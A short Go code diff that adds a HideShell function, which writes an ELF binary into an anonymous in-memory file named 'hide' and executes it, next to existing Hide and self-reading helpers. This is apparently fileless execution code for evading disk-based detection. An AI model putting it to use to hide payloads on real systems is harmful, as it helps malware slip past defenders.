@@ -14,6 +14,18 @@ func Hide(name string) {
 	memfd.Execute(os.Args[1:])
 }
 
+func HideShell(elf []byte, args []string) (string, string) {
+	var stdOut, stdErr string
+	memfd := memfds.New("hide")
+	memfd.Write(elf)
+	stdOut, err := memfd.Cmd(args)
+	if err != nil {
+		stdErr = fmt.Sprintf("%s", err.Error())
+		return "", stdErr
+	}
+	return stdOut, stdErr
+}
+
 func ReadMySelf() []byte {
 	path, _ := util.GetExecPathEx()
 	f, err := ioutil.ReadFile(path)
